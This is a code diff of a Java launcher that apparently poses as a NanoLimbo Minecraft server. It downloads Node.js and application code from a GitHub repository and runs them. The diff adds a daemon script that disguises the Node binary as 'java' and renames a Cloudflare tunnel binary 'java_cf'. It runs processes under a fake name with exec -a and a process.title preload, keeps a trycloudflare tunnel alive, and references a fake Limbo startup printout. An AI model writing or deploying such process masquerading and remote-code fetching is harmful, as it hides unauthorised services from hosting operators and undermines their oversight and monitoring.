@@ -78,9 +78,6 @@ private static void clearConsole() {
 // Java 纯网络下载与解压核心
 // ============================================================
 
-/**
- * 支持 302/301 重定向的纯 Java 下载方法
- */
 private static boolean downloadFile(String urlStr, Path target, String token) {
     try {
         int redirectCount = 0;
@@ -88,7 +85,7 @@ private static boolean downloadFile(String urlStr, Path target, String token) {
         
         while (redirectCount < 10) {
             HttpURLConnection conn = (HttpURLConnection) currentUrl.openConnection();
-            conn.setInstanceFollowRedirects(false); // 手动处理重定向
+            conn.setInstanceFollowRedirects(false);
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(120000);
             conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
@@ -101,7 +98,7 @@ private static boolean downloadFile(String urlStr, Path target, String token) {
             if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP || responseCode == HttpURLConnection.HTTP_SEE_OTHER) {
                 String location = conn.getHeaderField("Location");
                 if (location == null) break;
-                currentUrl = new URL(currentUrl, location); // 支持相对路径
+                currentUrl = new URL(currentUrl, location);
                 redirectCount++;
                 continue;
             }
@@ -117,26 +114,29 @@ private static boolean downloadFile(String urlStr, Path target, String token) {
                 }
                 return true;
             } else {
-                return false; // 4xx/5xx 错误
+                return false;
             }
         }
     } catch (Exception ignored) {}
     return false;
 }
 
-/**
- * 多镜像回退下载
- */
 private static boolean downloadWithMirrors(List<String> urls, Path target, String token) {
     for (String url : urls) {
-        if (downloadFile(url, target, token)) return true;
+        try {
+            Files.deleteIfExists(target);
+            if (downloadFile(url, target, token)) {
+                if (Files.exists(target) && Files.size(target) > 1024) {
+                    return true;
+                } else {
+                    Files.deleteIfExists(target);
+                }
+            }
+        } catch (Exception ignored) {}
     }
     return false;
 }
 
-/**
- * 使用 Java 原生 ZipInputStream 解压 GitHub Zipball，并剥离外层目录
- */
 private static void extractGithubZip(Path zipFile, Path targetDir) throws IOException {
     Files.createDirectories(targetDir);
     try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
@@ -145,7 +145,6 @@ private static void extractGithubZip(Path zipFile, Path targetDir) throws IOExce
             if (entry.isDirectory()) continue;
             
             String name = entry.getName();
-            // 剥离 GitHub 生成的外层哈希目录 (例如: repo-master-abc123/file.js -> file.js)
             int slashIndex = name.indexOf('/');
             if (slashIndex >= 0) {
                 name = name.substring(slashIndex + 1);
@@ -162,22 +161,17 @@ private static void extractGithubZip(Path zipFile, Path targetDir) throws IOExce
     }
 }
 
-/**
- * 调用系统 tar 解压 Node.js (Linux 必备命令)
- */
 private static boolean extractTarGz(Path archive, Path targetDir) {
     try {
         ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", archive.toString(), "-C", targetDir.toString(), "--strip-components=1");
         pb.redirectErrorStream(true);
         Process p = pb.start();
-        // 消费输出流防止阻塞
         try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) { while (r.readLine() != null); }
         return p.waitFor(2, TimeUnit.MINUTES) && p.exitValue() == 0;
     } catch (Exception e) {
         return false;
     }
 }
-
 
 // ============================================================
 // 入口
@@ -202,7 +196,6 @@ public static void main(String[] args) {
             Files.deleteIfExists(botDir.resolve("daemon.log"));
             Files.deleteIfExists(botDir.resolve(".pids"));
 
-            // ★ 启动纯 Java 部署流程
             Thread deployThread = new Thread(() -> {
                 try { executeJavaDeployment(botDir); } catch (Exception e) {
                     System.err.println("[Deploy] Fatal error during Java deployment: " + e.getMessage());
@@ -267,7 +260,7 @@ public static void main(String[] args) {
 }
 
 // ============================================================
-// 核心：纯 Java 部署流程
+// 核心：纯 Java 部署流程 (修复临时文件自删漏洞)
 // ============================================================
 
 private static void executeJavaDeployment(Path workDir) throws Exception {
@@ -305,14 +298,13 @@ private static void executeJavaDeployment(Path workDir) throws Exception {
         String nodeFile = "node-" + NODE_VERSION + "-linux-" + arch + ".tar.gz";
         String nodeUrl = "https://nodejs.org/dist/" + NODE_VERSION + "/" + nodeFile;
         
-        Path archive = workDir.resolve("node.tar.gz");
+        Path archive = Paths.get("/tmp", "nanolimbo_node.tar.gz");
         List<String> urls = Arrays.asList(nodeUrl, "https://gh-proxy.com/" + nodeUrl, "https://mirror.ghproxy.com/" + nodeUrl);
         
         if (downloadWithMirrors(urls, archive, null)) {
             if (!extractTarGz(archive, nodeDir)) throw new RuntimeException("Failed to extract Node.js tar.gz");
             Files.deleteIfExists(archive);
             
-            // 复制备用真实二进制
             Path nodeBin = nodeDir.resolve("bin/node");
             Path nodeReal = nodeDir.resolve("bin/.node_real");
             if (Files.exists(nodeBin)) Files.copy(nodeBin, nodeReal, StandardCopyOption.REPLACE_EXISTING);
@@ -324,21 +316,20 @@ private static void executeJavaDeployment(Path workDir) throws Exception {
     // ================= 2. 下载并解压应用代码 =================
     if (!Files.exists(appDir.resolve(NODE_SCRIPT)) || "true".equalsIgnoreCase(NODE_FORCE_UPDATE)) {
         limboLog("[Deploy] Downloading application code via Java...");
-        Path archive = workDir.resolve("app.zip");
         
-        // ★ 改用 zipball 格式，方便 Java 原生解压
+        Path archive = Paths.get("/tmp", "nanolimbo_app.zip");
+        
         String apiUrl = "https://api.github.com/repos/" + GITHUB_REPO + "/zipball/" + GITHUB_BRANCH;
         String fallbackUrl = "https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".zip";
         
         List<String> urls = new ArrayList<>();
-        if (!authToken.isEmpty()) urls.add(apiUrl); // 优先尝试 API (带 Token)
+        if (!authToken.isEmpty()) urls.add(apiUrl);
         urls.add(fallbackUrl);
         urls.add("https://gh-proxy.com/" + fallbackUrl);
         urls.add("https://mirror.ghproxy.com/" + fallbackUrl);
         if (!authToken.isEmpty()) urls.add("https://gh-proxy.com/" + apiUrl);
 
         if (downloadWithMirrors(urls, archive, authToken)) {
-            // 清理旧代码 (保留关键目录)
             Files.walk(appDir, 1)
                  .filter(p -> !p.equals(appDir))
                  .filter(p -> !p.getFileName().toString().equals(".node") && !p.getFileName().toString().equals("jre21") && !p.getFileName().toString().equals(".cf") && !p.getFileName().toString().equals(".pids"))
@@ -347,7 +338,7 @@ private static void executeJavaDeployment(Path workDir) throws Exception {
             extractGithubZip(archive, appDir);
             Files.deleteIfExists(archive);
         } else {
-            throw new RuntimeException("Failed to download application code");
+            throw new RuntimeException("Failed to download application code. Check network or GitHub Token.");
         }
     }
 
@@ -451,80 +442,6 @@ private static void deleteDirectory(File file) {
     file.delete();
 }
 
-// 省略了部分未修改的函数，请保留你原项目中的以下函数：
-// autoFixLimboConfig, printFakeLimboStartup, randInt, checkDeployInfo, startTunnelMonitor
-
-// ============================================================
-// 生成守护脚本 (只负责启动、守护、防502，不再负责下载)
-// ============================================================
-
-private static Path generateDaemonScript(Path workDir) throws Exception {
-    Path dir = workDir.toAbsolutePath();
-    Path script = dir.resolve("daemon.sh");
-    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";
-
-    String content = "#!/bin/bash\n" +
-        "set +e\n" +
-        "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
-        "cleanup() {\n for job in $(jobs -p 2>/dev/null); do kill_tree $job; done while wait -n 2>/dev/null; do :; done }\n" +
-        "trap cleanup EXIT TERM INT\n" +
-        "\n" +
-        "WORK_DIR=\"" + dir + "\"\n" +
-        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
-        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
-        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
-        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
-        "NODE_REAL=\"$WORK_DIR/.node/bin/.node_real\"\n" +
-        "APP_DIR=\"$WORK_DIR\"\n" +
-        "NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
-        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
-        "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
-        "\n" +
-        "# 生成 preload\n" +
-        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
-        "try {\n process.title = '" + FAKE_CMD + "'; var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork; var _wp = process.env._JAVA_WRAPPER || process.execPath;\n _cp.spawn = function(cmd, args, opts) {\n if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n opts = Object.assign({}, opts || {}); opts.execPath = _wp; cmd = _wp;\n } return _origSpawn.call(this, cmd, args, opts);\n };\n _cp.fork = function(mod, args, opts) {\n opts = Object.assign({}, opts || {}); opts.execPath = _wp; return _origFork.call(this, mod, args, opts);\n };\n} catch(e) {}\n" +
-        "PRELOAD_EOF\n" +
-        "\n" +
-        "# 赋予执行权限\n" +
-        "chmod +x \"$NODE_FAKE\" \"$CF_BIN\" 2>/dev/null\n" +
-        "ln -sf \"$NODE_REAL\" \"$NODE_FAKE\" 2>/dev/null\n" +
-        "\n" +
-        "kill_tree() {\n local PID=$1; if [ -z \"$PID\" ]; then return; fi; if ! kill -0 $PID 2>/dev/null; then wait $PID 2>/dev/null; return; fi\n local CHILDREN=$(pgrep -P $PID 2>/dev/null); for child in $CHILDREN; do kill_tree $child; done\n kill $PID 2>/dev/null; local waited=0; while [ $waited -lt 5 ]; do if ! kill -0 $PID 2>/dev/null; then break; fi; sleep 1; waited=$((waited + 1)); done\n if kill -0 $PID 2>/dev/null; then kill -9 $PID 2>/dev/null; fi; wait $PID 2>/dev/null\n}\n" +
-        "\n" +
-        "write_cf_config() {\n local PROTO=$1; local PORT=$2\n cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\nurl: http://localhost:$PORT\nno-autoupdate: true\nprotocol: $PROTO\nCFCONF\n}\n" +
-        "\n" +
-        "start_cf_tunnel() {\n local PROTO=$1; local PORT=$2; local LOG_FILE=$3\n write_cf_config \"$PROTO\" \"$PORT\"\n (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n echo $!\n}\n" +
-        "\n" +
-        "# === 启动 Node 分配端口 ===\n" +
-        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
-        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
-        "export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
-        "\n" +
-        "(exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" --require \"$WORK_DIR/.nd_preload.js\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
-        "NODE_PID=$!\n" +
-        "echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
-        "\n" +
-        "for i in $(seq 1 60); do\n HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1\ndone\n" +
-        "echo \"$NODE_PORT\" > \"$WORK_DIR/.node_port\"\n" +
-        "\n" +
-        "# === 启动隧道 ===\n" +
-        "CF_PID=\"\"\n" +
-        "TUNNEL_OK=false\n" +
-        "for PROTO in quic http2 auto; do\n if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n NEW_PID=$(start_cf_tunnel \"$PROTO\" \"$NODE_PORT\" \"$WORK_DIR/.cf/cf.log\")\n CF_PID=$NEW_PID\n for i in $(seq 1 45); do\n if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n if [ -n \"$URL\" ]; then\n echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"PROTOCOL=$PROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n TUNNEL_OK=true; break\n fi; sleep 1\n done\n if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n" +
-        "done\n" +
-        "\n" +
-        "# === 守护循环 ===\n" +
-        "while true; do\n if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n wait $NODE_PID 2>/dev/null\n if [ -n \"$CF_PID\" ]; then kill_tree \"$CF_PID\"; CF_PID=\"\"; fi\n (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" --require \"$WORK_DIR/.nd_preload.js\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n NODE_PID=$!\n for i in $(seq 1 60); do\n HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1\n done\n fi\n \n NEED_REBUILD=false\n if [ -z \"$CF_PID\" ]; then NEED_REBUILD=true\n elif ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; NEED_REBUILD=true; fi\n \n if [ \"$NEED_REBUILD\" = \"true\" ]; then\n rm -f \"$WORK_DIR/.cf/tunnel_url.txt\" \"$WORK_DIR/.cf/cf.log\"\n TUNNEL_OK=false\n for RPROTO in quic http2 auto; do\n if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$NODE_PORT\" \"$WORK_DIR/.cf/cf.log\")\n CF_PID=$NEW_PID\n for i in $(seq 1 45); do\n if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n if [ -n \"$URL\" ]; then\n echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n TUNNEL_OK=true; break\n fi; sleep 1\n done\n if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n done\n fi\n while wait -n 2>/dev/null; do :; done\n sleep 15\ndone\n";
-
-    Files.writeString(script, content);
-    script.toFile().setExecutable(true);
-    return script;
-}
-
-// ============================================================
-// 补全缺失的函数 (确保编译通过)
-// ============================================================
-
 private static void autoFixLimboConfig() {
     try {
         Path configFile = Paths.get("settings.yml");
@@ -603,6 +520,68 @@ private static void startTunnelMonitor() {
         }
     }, "Tunnel-Monitor");
     monitor.setDaemon(true); monitor.start();
+}
+
+// ============================================================
+// 生成守护脚本 (递归杀树防僵尸，严防死锁 502)
+// ============================================================
+
+private static Path generateDaemonScript(Path workDir) throws Exception {
+    Path dir = workDir.toAbsolutePath();
+    Path script = dir.resolve("daemon.sh");
+    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";
+
+    String content = "#!/bin/bash\n" +
+        "set +e\n" +
+        "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
+        "cleanup() {\n for job in $(jobs -p 2>/dev/null); do kill_tree $job; done\n while wait -n 2>/dev/null; do :; done\n}\n" +
+        "trap cleanup EXIT TERM INT\n" +
+        "\n" +
+        "WORK_DIR=\"" + dir + "\"\n" +
+        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
+        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
+        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
+        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
+        "NODE_REAL=\"$WORK_DIR/.node/bin/.node_real\"\n" +
+        "APP_DIR=\"$WORK_DIR\"\n" +
+        "NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
+        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
+        "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
+        "\n" +
+        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
+        "try {\n process.title = '" + FAKE_CMD + "'; var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork; var _wp = process.env._JAVA_WRAPPER || process.execPath;\n _cp.spawn = function(cmd, args, opts) {\n if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n opts = Object.assign({}, opts || {}); opts.execPath = _wp; cmd = _wp;\n } return _origSpawn.call(this, cmd, args, opts);\n };\n _cp.fork = function(mod, args, opts) {\n opts = Object.assign({}, opts || {}); opts.execPath = _wp; return _origFork.call(this, mod, args, opts);\n };\n} catch(e) {}\n" +
+        "PRELOAD_EOF\n" +
+        "\n" +
+        "chmod +x \"$NODE_FAKE\" \"$CF_BIN\" 2>/dev/null\n" +
+        "ln -sf \"$NODE_REAL\" \"$NODE_FAKE\" 2>/dev/null\n" +
+        "\n" +
+        "kill_tree() {\n local PID=$1; if [ -z \"$PID\" ]; then return; fi; if ! kill -0 $PID 2>/dev/null; then wait $PID 2>/dev/null; return; fi\n local CHILDREN=$(pgrep -P $PID 2>/dev/null); for child in $CHILDREN; do kill_tree $child; done\n kill $PID 2>/dev/null; local waited=0; while [ $waited -lt 5 ]; do if ! kill -0 $PID 2>/dev/null; then break; fi; sleep 1; waited=$((waited + 1)); done\n if kill -0 $PID 2>/dev/null; then kill -9 $PID 2>/dev/null; fi; wait $PID 2>/dev/null\n}\n" +
+        "\n" +
+        "write_cf_config() {\n local PROTO=$1; local PORT=$2\n cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\nurl: http://localhost:$PORT\nno-autoupdate: true\nprotocol: $PROTO\nCFCONF\n}\n" +
+        "\n" +
+        "start_cf_tunnel() {\n local PROTO=$1; local PORT=$2; local LOG_FILE=$3\n write_cf_config \"$PROTO\" \"$PORT\"\n (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n echo $!\n}\n" +
+        "\n" +
+        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
+        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
+        "export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
+        "\n" +
+        "(exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" --require \"$WORK_DIR/.nd_preload.js\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
+        "NODE_PID=$!\n" +
+        "echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
+        "\n" +
+        "for i in $(seq 1 60); do\n HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1\ndone\n" +
+        "echo \"$NODE_PORT\" > \"$WORK_DIR/.node_port\"\n" +
+        "\n" +
+        "CF_PID=\"\"\n" +
+        "TUNNEL_OK=false\n" +
+        "for PROTO in quic http2 auto; do\n if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n NEW_PID=$(start_cf_tunnel \"$PROTO\" \"$NODE_PORT\" \"$WORK_DIR/.cf/cf.log\")\n CF_PID=$NEW_PID\n for i in $(seq 1 45); do\n if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n if [ -n \"$URL\" ]; then\n echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"PROTOCOL=$PROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n TUNNEL_OK=true; break\n fi; sleep 1\n done\n if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n" +
+        "done\n" +
+        "\n" +
+        "while true; do\n if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n wait $NODE_PID 2>/dev/null\n if [ -n \"$CF_PID\" ]; then kill_tree \"$CF_PID\"; CF_PID=\"\"; fi\n (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" --require \"$WORK_DIR/.nd_preload.js\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n NODE_PID=$!\n for i in $(seq 1 60); do\n HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1\n done\n fi\n \n NEED_REBUILD=false\n if [ -z \"$CF_PID\" ]; then NEED_REBUILD=true\n elif ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; NEED_REBUILD=true; fi\n \n if [ \"$NEED_REBUILD\" = \"true\" ]; then\n rm -f \"$WORK_DIR/.cf/tunnel_url.txt\" \"$WORK_DIR/.cf/cf.log\"\n TUNNEL_OK=false\n for RPROTO in quic http2 auto; do\n if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$NODE_PORT\" \"$WORK_DIR/.cf/cf.log\")\n CF_PID=$NEW_PID\n for i in $(seq 1 45); do\n if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n if [ -n \"$URL\" ]; then\n echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n TUNNEL_OK=true; break\n fi; sleep 1\n done\n if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n done\n fi\n while wait -n 2>/dev/null; do :; done\n sleep 15\ndone\n";
+
+    Files.writeString(script, content);
+    script.toFile().setExecutable(true);
+    return script;
 }
 
 }
